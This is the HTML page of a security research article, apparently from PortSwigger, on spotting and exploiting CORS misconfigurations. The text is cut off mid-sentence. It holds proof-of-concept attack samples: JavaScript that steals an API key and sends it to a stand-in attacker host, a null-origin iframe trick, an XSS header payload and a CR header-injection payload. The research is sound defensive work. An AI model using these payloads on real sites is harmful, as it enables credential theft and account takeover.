
<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <meta content="IE=edge" http-equiv="X-UA-Compatible">
        <meta content="width=device-width, initial-scale=1" name="viewport">
        <title>Exploiting CORS misconfigurations for Bitcoins and bounties | PortSwigger Research</title>
        <meta name="description" content="(or CORS misconfiguration misconceptions) In this post, I&#x27;ll show how to identify and exploit misconfigured CORS. This is a greatly condensed version of my AppSec USA talk. If you have time (or strugg">
        
<!-- Twitter data -->
    <meta name="twitter:card" content="summary_large_image">
<meta name="twitter:title" content="Exploiting CORS misconfigurations for Bitcoins and bounties">
    <meta name="twitter:description" content="(or CORS misconfiguration misconceptions) In this post, I&#x27;ll show how to identify and exploit misconfigured CORS. This is a greatly condensed version of my AppSec USA talk. If you have time (or strugg">
<meta name="twitter:image" content="https://portswigger.net/cms/images/68/ce/8da9e72e3dab-twittercard-exploiting-cors-misconfigurations-bitcoin-bounties-article.png">

<!-- Open Graph data -->
<meta property="og:title" content="Exploiting CORS misconfigurations for Bitcoins and bounties" />
    <meta property="og:description" content="(or CORS misconfiguration misconceptions) In this post, I&#x27;ll show how to identify and exploit misconfigured CORS. This is a greatly condensed version of my AppSec USA talk. If you have time (or strugg">
<meta property="og:type" content="article" />
<meta property="og:url" content="https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties" />
<meta property="og:image" content="https://portswigger.net/cms/images/68/ce/8da9e72e3dab-twittercard-exploiting-cors-misconfigurations-bitcoin-bounties-article.png" />
    <meta property="og:site_name" content="PortSwigger Research" />
    <meta property="article:published_time" content="2016-10-14T16:30:00" />

        <link rel="canonical" href="https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties"/>
        <link href="/content/images/logos/favicon.ico" rel="icon" type="image/x-icon"/>
        <link href="/content/images/logos/apple-touch-icon.png" rel="apple-touch-icon">
        <link href="/content/psresearch.css" rel="stylesheet" type="text/css">
        <link rel="alternate" type="application/rss+xml" href="/research/rss" title="PortSwigger Research">
        <link rel="preload" href="/content/fonts/ps-icons-small/ps-icons-small.woff?td2uot" as="font" crossorigin="anonymous">
<link rel="preload" href="/content/fonts/ps-main/ps-icons.woff?l1la2n" as="font" crossorigin="anonymous">
        
<script nonce="p0LzyYu4Y/57MJYrKTG7c+aKsgqxn/Ae">
    const dimensionName = "dimension2";
    const userRef = "";
</script>



<script nonce="p0LzyYu4Y/57MJYrKTG7c+aKsgqxn/Ae">

    (function(window, document, dataLayerName, id) {
    function stgCreateCookie(a,b,c){var d="";if(c){var e=new Date;e.setTime(e.getTime()+24*c*60*60*1e3),d=";expires="+e.toUTCString()}document.cookie=a+"="+b+d+"; path=/"}
    var isStgDebug=(window.location.href.match("stg_debug")||document.cookie.match("stg_debug"))&&!window.location.href.match("stg_disable_debug");
    stgCreateCookie("stg_debug",isStgDebug?1:"",isStgDebug?14:-1);
    var qP=[];dataLayerName!=="dataLayer"&&qP.push("data_layer_name="+dataLayerName),isStgDebug&&qP.push("stg_debug");
    var qPString=qP.length>0?("?"+qP.join("&")):"";
    document.write('<nonce-script src="https://ps.containers.piwik.pro/'+id+'.sync.js' + qPString + '" nonce="p0LzyYu4Y/57MJYrKTG7c+aKsgqxn/Ae"></' + 'nonce-script>');
    })(window, document, 'dataLayer', '287552c2-4917-42e0-8982-ba994a2a73d7');

    window.dataLayer = window.dataLayer || [];
    window.dataLayer.push({
        customerId : '',
    });
</script> 
    </head>
    <body class="theme-research">
        


<script nonce="p0LzyYu4Y/57MJYrKTG7c+aKsgqxn/Ae">
(function(window, document, dataLayerName, id) {
    window[dataLayerName]=window[dataLayerName]||[],window[dataLayerName].push({start:(new Date).getTime(),event:"stg.start"});
    var scripts=document.getElementsByTagName('script')[0],tags=document.createElement('script');
    function stgCreateCookie(a,b,c){var d="";if(c){var e=new Date;e.setTime(e.getTime()+24*c*60*60*1e3),d=";expires="+e.toUTCString()}document.cookie=a+"="+b+d+"; path=/"}
    var isStgDebug=(window.location.href.match("stg_debug")||document.cookie.match("stg_debug"))&&!window.location.href.match("stg_disable_debug");
    stgCreateCookie("stg_debug",isStgDebug?1:"",isStgDebug?14:-1);
    var qP=[];dataLayerName!=="dataLayer"&&qP.push("data_layer_name="+dataLayerName),tags.nonce="p0LzyYu4Y/57MJYrKTG7c+aKsgqxn/Ae",isStgDebug&&qP.push("stg_debug");
    var qPString=qP.length>0?("?"+qP.join("&")):"";
    tags.async=!0,tags.src="https://ps.containers.piwik.pro/"+id+".js"+qPString,
    scripts.parentNode.insertBefore(tags,scripts);
    !function(a,n,i){a[n]=a[n]||{};for(var c=0;c<i.length;c++)!function(i){a[n][i]=a[n][i]||{},a[n][i].api=a[n][i].api||function(){
    var a=[].slice.call(arguments,0);"string"==typeof a[0]&&window[dataLayerName].push({event:n+"."+i+":"+a[0],parameters:[].slice.call(arguments,1)})}}(i[c])}(window,"ppms",["tm","cm"]);
    })(window, document, 'dataLayer', '287552c2-4917-42e0-8982-ba994a2a73d7');
</script>
        


        <header class="page-header" id="top">
            <div class="container">
    <a class="logo" href="/"></a>
    <div class="header-right">
        <div class="login-buttons">
                <a class="button-orange-small" href="/users">Login</a>
        </div>
        

    <input type="checkbox" id="hamburger-mobile" class="hamburger-input-mobile">
    <input type="radio" id="hamburger-desktop" class="hamburger-input-desktop" name="mega-nav-input">
    <div class="hamburger-menu-mobile">
        <label class="hamburger-menu-label header-hidden" for="hamburger-mobile">
            <span class="hamburger-layers"></span>
        </label>
    </div>
    <div class="mega-nav">
        <input type="radio" id="mega-nav-close" class="mega-nav-input-close" name="mega-nav-input">
        <input type="radio" id="mega-nav-label-1" class="mega-nav-input-1" name="mega-nav-input">
        <input type="radio" id="mega-nav-label-2" class="mega-nav-input-2" name="mega-nav-input">
        <input type="radio" id="mega-nav-label-6" class="mega-nav-input-6" name="mega-nav-input">
        <input type="radio" id="mega-nav-label-7" class="mega-nav-input-7" name="mega-nav-input">

        <label for="mega-nav-close" class="mega-nav-close"></label>

        <label class="mega-nav-label mega-nav-label-1" for="mega-nav-label-1">
            <span class="mega-nav-text">Products</span>
            <span class="icon-arrow-head-down"></span>
        </label>
        <label class="mega-nav-label mega-nav-label-2" for="mega-nav-label-2">
            <span class="mega-nav-text">Solutions</span>
            <span class="icon-arrow-head-down"></span>
        </label>
        <a class="mega-nav-link" href="/research"><span class="mega-nav-text">Research</span></a>
        <a class="mega-nav-link" href="/web-security"><span class="mega-nav-text">Academy</span></a>
        <label class="mega-nav-label mega-nav-label-6" for="mega-nav-label-6">
            <span class="mega-nav-text">Support</span>
            <span class="icon-arrow-head-down"></span>
        </label>

        <label class="mega-nav-label mega-nav-label-7 header-hidden" for="mega-nav-label-7">
            <span class="mega-nav-text">Company</span>
            <span class="icon-arrow-head-down"></span>
        </label>
        <div class="hamburger-menu-desktop">
            <label class="hamburger-menu-label header-show" for="hamburger-desktop">
                <span class="hamburger-layers"></span>
            </label>
            <div>
                <a class="hamburger-menu-desktop-link hamburger-menu-desktop-link-1" href="/customers"><span class="mega-nav-text">Customers</span></a>
                <a class="hamburger-menu-desktop-link hamburger-menu-desktop-link-3" href="/about"><span class="mega-nav-text">About</span></a>
                <a class="hamburger-menu-desktop-link hamburger-menu-desktop-link-4" href="/blog"><span class="mega-nav-text">Blog</span></a>
                <a class="hamburger-menu-desktop-link hamburger-menu-desktop-link-5" href="/careers"><span class="mega-nav-text">Careers</span></a>
                <a class="hamburger-menu-desktop-link hamburger-menu-desktop-link-6" href="/legal"><span class="mega-nav-text">Legal</span></a>
                <a class="hamburger-menu-desktop-link hamburger-menu-desktop-link-7" href="/contact"><span class="mega-nav-text">Contact</span></a>
                <a class="hamburger-menu-desktop-link hamburger-menu-desktop-link-8" href="/support/reseller-faqs"><span class="mega-nav-text">Resellers</span></a>
            </div>
        </div>

        <a class="mega-nav-link header-hidden" href="/users/youraccount"><span class="mega-nav-text">My account</span></a>
        <a class="hamburger-menu-link hamburger-menu-link-1" href="/customers"><span class="mega-nav-text">Customers</span></a>
        <a class="hamburger-menu-link hamburger-menu-link-3" href="/about"><span class="mega-nav-text">About</span></a>
        <a class="hamburger-menu-link hamburger-menu-link-4" href="/blog"><span class="mega-nav-text">Blog</span></a>
        <a class="hamburger-menu-link hamburger-menu-link-5" href="/careers"><span class="mega-nav-text">Careers</span></a>
        <a class="hamburger-menu-link hamburger-menu-link-6" href="/legal"><span class="mega-nav-text">Legal</span></a>
        <a class="hamburger-menu-link hamburger-menu-link-7" href="/contact"><span class="mega-nav-text">Contact</span></a>
        <a class="hamburger-menu-link hamburger-menu-link-8" href="/support/reseller-faqs"><span class="mega-nav-text">Resellers</span></a>

        <div class="mega-nav-container">

            <div class="mega-nav-content mega-nav-content-1">
                <div class="section-white-medium-no-padding">
                    <div class="container-columns-66-percent-right">
                        <div>
                            <a href="/burp/enterprise" class="link-block-white">
                                <img src="/content/images/svg/icons/enterprise.svg" alt="Burp Suite Enterprise Edition">
                                <span><strong>Burp Suite Enterprise Edition</strong></span>
                                <span>The enterprise-enabled dynamic web vulnerability scanner.</span>
                            </a>

                            <a href="/burp/pro" class="link-block-white">
                                <img src="/content/images/svg/icons/professional.svg" alt="Burp Suite Professional">
                                <span><strong>Burp Suite Professional</strong></span>
                                <span>The world's #1 web penetration testing toolkit.</span>
                            </a>

                            <a href="/burp/communitydownload" class="link-block-white">
                                <img src="/content/images/svg/icons/community.svg" alt="Burp Suite Community Edition">
                                <span><strong>Burp Suite Community Edition</strong></span>
                                <span>The best manual tools to start web security testing.</span>
                            </a>

                            <a href="/burp/dastardly" class="link-block-white">
                                <img src="/mega-nav/images/dastardly.svg" alt="Dastardly, from Burp Suite">
                                <span><strong>Dastardly, from Burp Suite</strong></span>
                                <span>Free, lightweight web application security scanning for CI/CD.</span>
                            </a>

                            <a href="/burp" class="chevron-after">View all product editions</a>
                        </div>

                        <div>
                            <div class="container-cards-lists-white">
                                <a href="/burp/vulnerability-scanner">
                                    <p><strong>Burp Scanner</strong></p>
                                    <p>Burp Suite's web vulnerability scanner</p>
                                    <img src="/mega-nav/images/burp-suite-scanner.jpg" alt="Burp Suite's web vulnerability scanner'">
                                </a>
                            </div>

                        </div>


                    </div>
                </div>
            </div>

            <div class="mega-nav-content mega-nav-content-2">
                <div class="section-white-medium-no-padding">
                    <div class="container-columns-66-percent-right">
                        <div>
                            <div class="container-columns">
                                <a href="/solutions/attack-surface-visibility" class="link-block-white">
                                    <span><strong>Attack surface visibility</strong></span>
                                    <span>Improve security posture, prioritize manual testing, free up time.</span>
                                </a>
                                <a href="/solutions/ci-driven-scanning" class="link-block-white">
                                    <span><strong>CI-driven scanning</strong></span>
                                    <span>More proactive security - find and fix vulnerabilities earlier.</span>
                                </a>
                                <a href="/solutions" class="link-block-white">
                                    <span><strong>Application security testing</strong></span>
                                    <span>See how our software enables the world to secure the web.</span>
                                </a>
                                <a href="/solutions/devsecops" class="link-block-white">
                                    <span><strong>DevSecOps</strong></span>
                                    <span>Catch critical bugs; ship more secure software, more quickly.</span>
                                </a>

                                <a href="/solutions/penetration-testing" class="link-block-white">
                                    <span><strong>Penetration testing</strong></span>
                                    <span>Accelerate penetration testing - find more bugs, more quickly.</span>
                                </a>
                                <a href="/solutions/automated-security-testing" class="link-block-white">
                                    <span><strong>Automated scanning</strong></span>
                                    <span>Scale dynamic scanning. Reduce risk. Save time/money.</span>
                                </a>

                                <a href="/solutions/bug-bounty-hunting" class="link-block-white">
                                    <span><strong>Bug bounty hunting</strong></span>
                                    <span>Level up your hacking and earn more bug bounties.</span>
                                </a>
                                <a href="/solutions/compliance" class="link-block-white">
                                    <span><strong>Compliance</strong></span>
                                    <span>Enhance security monitoring to comply with confidence.</span>
                                </a>
                            </div>
                            <a href="/solutions" class="chevron-after">View all solutions</a>
                        </div>

                        <div>
                            <div class="container-cards-lists-white">
                                <a href="/burp/enterprise/resources/enterprise-edition-vs-professional">
                                    <p><strong>Product comparison</strong></p>
                                    <p>What's the difference between Pro and Enterprise Edition?</p>
                                    <img src="/mega-nav/images/burp-suite.jpg" alt="Burp Suite Professional vs Burp Suite Enterprise Edition">
                                </a>
                            </div>

                        </div>


                    </div>
                </div>
            </div>

            <div class="mega-nav-content mega-nav-content-6">
                <div class="section-white-medium-no-padding">
                    <div class="container-columns-66-percent-right">
                        <div>
                            <div class="container-columns">
                                <a href="/support" class="link-block-white">
                                    <span><strong>Support Center</strong></span>
                                    <span>Get help and advice from our experts on all things Burp.</span>
                                </a>
                                <a href="/burp/documentation" class="link-block-white">
                                    <span><strong>Documentation</strong></span>
                                    <span>Tutorials and guides for Burp Suite.</span>
                                </a>
                                <a href="/burp/documentation/desktop/getting-started" class="link-block-white">
                                    <span><strong>Get Started - Professional</strong></span>
                                    <span>Get started with Burp Suite Professional.</span>
                                </a>
                                <a href="/burp/documentation/enterprise/getting-started" class="link-block-white">
                                    <span><strong>Get Started - Enterprise</strong></span>
                                    <span>Get started with Burp Suite Enterprise Edition.</span>
                                </a>
                                <a href="https://forum.portswigger.net/" class="link-block-white">
                                    <span><strong>User Forum</strong></span>
                                    <span>Get your questions answered in the User Forum.</span>
                                </a>
                                <a href="/burp/releases" class="link-block-white">
                                    <span><strong>Downloads</strong></span>
                                    <span>Download the latest version of Burp Suite.</span>
                                </a>
                            </div>
                            <a href="/support" class="chevron-after">Visit the Support Center</a>
                        </div>

                        <div>
                            <div class="container-cards-lists-white">
                                <a href="/burp/releases">
                                    <p><strong>Downloads</strong></p>
                                    <p>Download the latest version of Burp Suite.</p>
                                    <img src="/mega-nav/images/latest-burp-suite-software-download.jpg" alt="The latest version of Burp Suite software for download">
                                </a>
                            </div>

                        </div>


                    </div>
                </div>
            </div>

        </div>

    </div>


    </div>
</div>
        </header>
        <nav class="navigation-top">
            <input id="nav-main-featured-research" type="checkbox">
            <label for="nav-main-featured-research">
                <span>Articles</span>
                <span class="icon-arrow-head-down"></span>
            </label>
            <ul>
                

                <li >
                    <a href="/research">Overview</a>
                </li>
                <li >
                    <input type="checkbox" id="nav-featured-research">
<label for="nav-featured-research">
    <span>Core Topics</span>
    <span class="icon-arrow-head-down"></span>
</label>
    <div>
            <a href="/research/black-hat">Black Hat</a>
            <a href="/research/cross-site-scripting-research">XSS</a>
            <a href="/research/request-smuggling">Request Smuggling</a>
            <a href="/research/template-injection">Template Injection</a>
            <a href="/research/top-10-web-hacking-techniques">Top 10 Hacking Techniques</a>
    </div>

                </li>
                <li class = current>
                    <a href="/research/articles">Articles</a>
                </li>
                <li >
                    <input type="checkbox" id="nav-meet-the-researchers">
<label for="nav-meet-the-researchers">
    <span>Meet the Researchers</span>
    <span class="icon-arrow-head-down"></span>
</label>
<div>
    <a href="/research/james-kettle">James Kettle</a>
    <a href="/research/gareth-heyes">Gareth Heyes</a>
    <a href="/research/martin-doyhenard">Martin Doyhenard</a>
    <a href="/research/zakhar-fedotkin">Zakhar Fedotkin</a>
</div>
                </li>
                <li >
                    <a href="/research/talks">Talks</a>
                </li>
                <li>
                    <a href="/research/rss">
                        RSS <span class="icon-rss"></span>
                    </a>
                </li>
            </ul>
        </nav>
        <div class="wrapper">
            


<input id="MediaId" name="MediaId" type="hidden" value="026948CE61BF95952F8C68EC954A6AA4" />


<div class="section theme-navy-1">
    <h1 class="heading-orange-1">Exploiting CORS misconfigurations for Bitcoins and bounties</h1>
    <div class="container-relative-medium-content-width">
        

<div class="share-right">
    <input id="share-button-right" type="checkbox">
    <ul class="share-right-ul">
        <li>
            <a href="https://twitter.com/share?url=https%3A%2F%2Fportswigger.net%2Fresearch%2Fexploiting-cors-misconfigurations-for-bitcoins-and-bounties&text=Exploiting&#x2B;CORS&#x2B;misconfigurations&#x2B;for&#x2B;Bitcoins&#x2B;and&#x2B;bounties%20-%20%40PortSwiggerRes%0A" target="_blank">
                <span class="icon-twitter"></span>
            </a>
        </li>
        <li>
            <a href="https://api.whatsapp.com/send?text=https%3A%2F%2Fportswigger.net%2Fresearch%2Fexploiting-cors-misconfigurations-for-bitcoins-and-bounties" target="_blank">
                <span class="icon-whatsapp"></span>
            </a>
        </li>
        <li>
            <a href="https://reddit.com/submit?url=https%3A%2F%2Fportswigger.net%2Fresearch%2Fexploiting-cors-misconfigurations-for-bitcoins-and-bounties" target="_blank">
                <span class="icon-reddit-dark"></span>
            </a>
        </li>
        <li>
            <a href="https://www.linkedin.com/sharing/share-offsite?url=https%3A%2F%2Fportswigger.net%2Fresearch%2Fexploiting-cors-misconfigurations-for-bitcoins-and-bounties" target="_blank">
                <span class="icon-linkedin"></span>
            </a>
        </li>
        <li>
            <a href="mailto:?subject=Exploiting&#x2B;CORS&#x2B;misconfigurations&#x2B;for&#x2B;Bitcoins&#x2B;and&#x2B;bounties&body=Exploiting&#x2B;CORS&#x2B;misconfigurations&#x2B;for&#x2B;Bitcoins&#x2B;and&#x2B;bounties%0A%0A(or&#x2B;CORS&#x2B;misconfiguration&#x2B;misconceptions)&#x2B;In&#x2B;this&#x2B;post%2C&#x2B;I%27ll&#x2B;show&#x2B;how&#x2B;to&#x2B;identify&#x2B;and&#x2B;exploit&#x2B;misconfigured&#x2B;CORS.&#x2B;This&#x2B;is&#x2B;a&#x2B;greatly&#x2B;condensed&#x2B;version&#x2B;of&#x2B;my&#x2B;AppSec&#x2B;USA&#x2B;talk.&#x2B;If&#x2B;you&#x2B;have&#x2B;time&#x2B;(or&#x2B;strugg%0A%0Ahttps://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties">
                <span class="icon-email"></span>
            </a>
        </li>
        <li>
            <a href="/research/rss">
                <span class="icon-rss"></span>
            </a>
        </li>
    </ul>

    <label class="share-button" for="share-button-right">
        <span class="icon-share"></span>
    </label>
</div>

    </div>
    
<div class="callout-individual-profile">
    <img alt="James Kettle" src="/content/images/profiles/callout_james_kettle_112px.png">
    <div>
            <h3><a href="/research/james-kettle">James Kettle</a></h3>
        <p>Director of Research</p>
        <p>
            
<span class="icon-twitter"></span>
<a href="https://twitter.com/albinowax">@albinowax</a>
        </p>
    </div>
</div>
    <ul class="publication-list">
        <li>
            <p><span class="icon-calendar"></span><strong>Published: </strong>14 October 2016 at 16:30 UTC</p>
        </li>
        <li>
            <p><strong>Updated: </strong>16 August 2022 at 09:24 UTC</p>
        </li>
        <li>
        </li>
    </ul>
    <p><span class="italic">(or CORS misconfiguration misconceptions)</span></p><p><img src="/cms/images/97/25/9784c111013b-article-exploiting-cors-misconfigurations-bitcoin-bounties-article.png" alt="Exploiting CORS misconfigurations for Bitcoins and bounties" title="PortSwigger Ltd"></p><p>In this post, I'll show how to identify and exploit misconfigured CORS. This is a greatly condensed version of my AppSec USA talk. If you have time (or struggle to understand anything) I highly recommend checking out&nbsp;<a target="_blank" href="/knowledgebase/papers/exploitingcorsmisconfigurations.pdf">the slides</a>&nbsp;and&nbsp;<a href="https://www.youtube.com/watch?v=wgkj4ZgxI4c&amp;list=PLpr-xdpM8wG8RHOguwOZhUHkKiDeWpvFp&amp;index=31" target="_blank">watching the video</a>. I also recommend our free&nbsp;<a href="https://portswigger.net/web-security/cors" target="_blank">interactive CORS labs</a>.</p><p class="youtube-wrapper"><iframe src="https://www.youtube.com/embed/wgkj4ZgxI4c?origin=https://portswigger.net&amp;rel=0" allowfullscreen="allowfullscreen"></iframe></p><h4>What is CORS? (Cross Origin Resource Sharing)</h4><p><a href="/web-security/cors">Cross-Origin Resource Sharing</a> (<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Access_control_CORS" target="_blank">CORS</a>) is a technology used by websites to make web browsers relax the Same Origin Policy, enabling cross-domain communication between different websites. It's frequently used by web APIs in particular, but in a modern complex website it can turn up anywhere. It’s widely understood that certain CORS configurations are dangerous, but some associated subtleties and implications are easily misunderstood. In this post I’ll show how to critically examine CORS configurations from a hacker’s perspective, and steal bitcoins.</p><h4>CORS for hackers</h4><p>Websites enable CORS by sending the following HTTP response header:</p><code>Access-Control-Allow-Origin: https://example.com</code><p>This permits the listed origin (domain) to make visitors’ web browsers issue cross-domain requests to the server and read the responses - something the <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy" target="_blank">Same Origin Policy</a> would normally prevent. By default this request will be issued without cookies or other credentials, so it can’t be used to steal sensitive user-specific information like <a href="/web-security/csrf">CSRF</a> tokens. The server can enable credential transmission using the following header:</p><code>Access-Control-Allow-Credentials: true</code><p>This creates a trust relationship - an XSS vulnerability on example.com is bad news for this site.</p><h4>Hidden in plain sight</h4><p>Trusting a single origin is easy. What if you need to trust multiple origins? The specification suggests that you can simply specify a space-separated list of origins, eg:</p><code>Access-Control-Allow-Origin: http://foo.com http://bar.net</code><p>However, no browsers actually support this.</p><p>You might also want to use a wildcard to trust all your subdomains, by specifying something like:</p><code>Access-Control-Allow-Origin: *.portswigger.net</code><p>But that won't work either. The only wildcard origin is '*'</p><p>There's a hidden safety catch in CORS, too. If you try to disable the <a href="/web-security/cors/same-origin-policy">SOP</a> entirely and expose your site to everyone by using the following terrifying looking header combination:</p><code>Access-Control-Allow-Origin: *<br>Access-Control-Allow-Credentials: true</code><p>Then you’ll get the following error in your browser console:</p><blockquote>Cannot use wildcard in <a href="/web-security/cors/access-control-allow-origin">Access-Control-Allow-Origin</a> when credentials flag is true.</blockquote><p>This exception is mentioned in the specification, and also <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Access_control_CORS#Requests_with_credentials" target="_blank">backed up by Mozilla’s documentation</a>:</p><blockquote>When responding to a credentialed request, &nbsp;server must specify a domain, and cannot use wild carding</blockquote><p>In other words, using a wildcard effectively disables the Allow-Credentials header.</p><p>As a result of these limitations, <span class="bold">many servers programmatically generate the Access-Control-Allow-Origin header based on the user-supplied Origin value</span>. This is the single most common CORS vulnerability. If you see a HTTP response with any&nbsp;<span class="codeextract">Access-Control-* headers</span>&nbsp;but no origins declared, this is a strong indication that the server will generate the header based on your input. Other servers will only send CORS headers if they receive a request containing the Origin header, making associated vulnerabilities extremely easy to miss.</p><h4>Credentials and bitcoins</h4><p>So, plenty of websites derive allowed origins from user input. What could possibly go wrong? I decided to assess a few bug bounty sites and find out. Note that as these sites all have bug bounty programs, every vulnerability I mention has been missed by numerous other bounty hunters.</p><p>I quickly replicated <a href="http://ejj.io/misconfigured-cors/" target="_blank">Evan Johnson's finding</a> that many applications&nbsp;make no attempt to validate the origin before reflecting it, and identified a vulnerable bitcoin exchange (which sadly prefers to remain unnamed):</p><code>GET /api/requestApiKey HTTP/1.1<br>Host: &lt;redacted&gt;<br>Origin: https://fiddle.jshell.net<br>Cookie: sessionid=... <br><br>HTTP/1.1 200 OK<br>Access-Control-Allow-Origin: https://fiddle.jshell.net<br>Access-Control-Allow-Credentials: true <br><br>{"[private API key]"}</code><p>Making a proof of concept CORS exploit to steal users' private API keys was trivial:</p><code>var req = new XMLHttpRequest(); <br>req.onload = reqListener; <br>req.open('get','https://btc-exchange/api/requestApiKey',true); <br>req.withCredentials = true;<br>req.send();<br><br>function reqListener() {<br>&nbsp; &nbsp; location='//atttacker.net/log?key='+this.responseText; <br>};</code><p>After retrieving a user's API key, I could disable account notifications, enable 2FA to lock them out, and transfer their bitcoins to an arbitrary address. That’s pretty severe for a header misconfiguration. Resisting the urge to take the bitcoins and run, I reported this to their bug bounty program and it was patched within an astounding 20 minutes.</p><p>Some websites make classic URL parsing mistakes when attempting to verify whether an origin should be trusted. For example, a site which I'll call advisor.com trusts all origins that ended in advisor.com, including definitelynotadvisor.com. Even worse, a second bitcoin exchange (let's call it btc.net) trusted all Origins that started with https://btc.net, including https://btc.net.evil.net. Unfortunately the site unexpectedly and permanently ceased operations before I could build a working proof of concept. I won't speculate as to why.</p><h4>The null origin</h4><p>If you were paying close attention earlier, you might have wondered what <a href="https://www.w3.org/TR/cors/#access-control-allow-origin-response-header" target="_blank">the 'null' origin</a> is for. The specification mentions it being triggered by redirects, and a few stackoverflow posts show that local HTML files also get it. Perhaps due to the association with local files, I found that quite a few websites whitelist it, including Google's PDF reader:</p><code>GET /reader?url=zxcvbn.pdf<br>Host: docs.google.com<br>Origin: null<br><br>HTTP/1.1 200 OK<br>Acess-Control-Allow-Origin: null<br>Access-Control-Allow-Credentials: true</code><p>and a certain third bitcoin exchange. This is great for attackers, because any website can easily obtain the null origin using a sandboxed iframe:</p><code>&lt;iframe sandbox="allow-scripts allow-top-navigation allow-forms" src='data:text/html,&lt;script&gt;*cors stuff here*&lt;/script&gt;’&gt;&lt;/iframe&gt;</code><p>Using a sequence of CORS requests, it was possible to steal encrypted backups of users' wallets, enabling an extremely fast offline brute-force attack against their wallet password. If anyone's password wasn't quite up to scratch, I'd get their bitcoins.</p><p>This particular misconfiguration is surprisingly common - if you look for it,&nbsp;<a href="https://www.shodan.io/search?query=%22Access-Control-Allow-Origin%3A+null%22" rel="nofollow" target="_blank">you'll find it</a>.&nbsp;The choice of the keyword 'null' is itself a tad unfortunate, because failing to configure an origin whitelist in certain applications may result in...</p><code>Access-Control-Allow-Origin: null</code><p>Oops.</p><h4 id="parsers">Breaking parsers</h4><p>Most websites use basic string operations to verify the Origin header, but some parse it as a URL instead. Three years after this research was initially published, <a href="https://twitter.com/fasthm00">Bitwis3</a> shared a technique to exploit parsers that takes advantage of Safari's tolerance for unusual characters in domain names. In Safari, this is a valid URL - try copy&amp;pasting it:</p><code>http://example.com%60.hackxor.net/static/cors.html</code><p>And the CORS request originating from that URL contains: </p><code>Origin: http://example.com`.hackxor.net/</code><p>If a site chooses to parse this header, it will potentially think that the hostname is example.com and reflect it, letting us exploit Safari users even though the site is using a whitelist of trusted hostnames. After receiving the <a href="https://twitter.com/fasthm00/status/1168844190702161920" target="_blank">tipoff</a> from Bitwis3, I personally tried this technique out in the wild and confirmed that it works on a range of real systems. </p><p>If you find that you can use _ instead of ` then you can also exploit people using Firefox and Chrome - this technique is documented in more depth in <a href="https://www.corben.io/advanced-cors-techniques/" target="_blank">Advanced CORS Exploitation Techniques</a>.&nbsp;</p><h4>Breaking HTTPS</h4><p>During this research I found two other prevalent whitelist implementation flaws, which often occur at the same time. The first is blindly whitelisting all subdomains - even non-existent ones. Many companies have subdomains pointing to applications hosted by third parties with awful security practises. Trusting that these don't have a single XSS vulnerability and never will in future is a really bad idea.</p><p>The second common error is failing to restrict the origin protocol. If a website is accessed over HTTPS but will happily accept CORS interactions from http://wherever, someone performing an active man-in-the-middle (MITM) attack can pretty much bypass its use of HTTPS entirely. Strict Transport Security and secure cookies will do little to prevent this attack. Check out the presentation recording when it lands for a demo of this attack.</p><h4>Abusing CORS without credentials</h4><p>We've seen that with credentials enabled, CORS can be highly dangerous. Without credentials, many attacks become irrelevant; it means you can't ride on a user's cookies, so there is often nothing to be gained by making their browser issue the request rather than issuing it yourself. Even token fixation attacks are infeasible, because any new cookies set are ignored by the browser.</p><p>One notable exception is when the victim's network location functions as a kind of authentication. You can use a victim’s browser as a proxy to bypass IP-based authentication and access intranet applications. In terms of impact this is similar to DNS rebinding, but much less fiddly to exploit.</p><h4>Vary: origin&nbsp;</h4><p>If you take a look at the 'Implementation Considerations' section in the CORS specification, you'll notice that it instructs developers specify the 'Vary: Origin' HTTP header whenever Access-Control-Allow-Origin headers are dynamically generated.</p><p>That might sound pretty simple, but immense numbers of people forget, including the W3C itself, leading to <a href="https://lists.w3.org/Archives/Public/public-webappsec/2016Jun/0057.html" target="_blank">this fantastic quote</a>:</p><blockquote>I must say, it doesn't make me very confident that soon more sites will be supporting CORS if not even the W3C manages to configure its server right<p class="text-right"> - Reto Gmür</p></blockquote><p>What happens if we ignore this advice? Mostly things just break. However, in the right circumstances it can enable some quite serious attacks.</p><h4>Client-Side cache poisoning</h4><p>You may have occasionally encountered a page with <a href="/web-security/cross-site-scripting/reflected">reflected XSS</a> in a custom HTTP header. Say a web page reflects the contents of a custom header without encoding:</p><code>GET /&nbsp;HTTP/1.1<br>Host: example.com<br>X-User-id:&nbsp;&lt;svg/onload=alert(1)&gt;<br><br>HTTP/1.1 200 OK<br>Access-Control-Allow-Origin: *<br>Access-Control-Allow-Headers: X-User-id<br>Content-Type: text/html<br>...<br>Invalid user: &lt;svg/onload=alert(1)&gt;</code><p>Without CORS, this is impossible to exploit as there’s no way to make someone’s browser send the X-User-id header cross-domain. With CORS, we can make them send this request. By itself, that's useless since the response containing our injected JavaScript won't be rendered. However, if Vary: Origin hasn't been specified the response may be stored in the browser's cache and displayed directly when the browser navigates to the associated URL. I've made a fiddle to <a href="https://jsfiddle.net/3gk8u8wu/3/" target="_blank">attempt this attack on a URL of your choice</a>. Since this attack uses client-side caching, it's actually quite reliable.</p><h4>Server-side cache poisoning</h4><p>If the stars are aligned we may be able to use server-side cache poisoning via HTTP header injection to create a stored XSS vulnerability.</p><p>If an application reflects the Origin header without even checking it for illegal characters like \r, we effectively have a HTTP header injection vulnerability against IE/Edge users as Internet Explorer and Edge view \r (0x0d) as a valid HTTP header terminator:</p><code>GET / HTTP/1.1<br>Origin: z[0x0d]Content-Type: text/html; charset=UTF-7</code><p>Internet Explorer sees the response as:</p><code>HTTP/1.1 200 OK<br>Access-Control-Allow-Origin: z<br>Content-Type: text/html; charset=UTF-7</code><p>This isn't directly exploitable because there's no way for an attacker to make someone's web browser send such a malformed header, but I can manually craft this request in Burp Suite and a server-side cache may save the response and serve it to other people. The payload I've used will change the page's character set to UTF-7, which is notoriously useful for creating XSS vulnerabilities.</p><h4>Good intentions and bad results</h4><p>I was initially surprised by the number of sites that dynamically generate Access-Control-Allow-Origin headers. The root cause of this behavior may be two key limitations of CORS - multiple origins in a single header aren't supported, and neither are wildcarded subdomains. This leaves many developers with no choice but to do dynamic header generation, risking all the implementation flaws discussed above. I think that if the specification authors and browsers decided to allow origin lists and partial wildcards, dynamic header generation and associated vulnerabilities would 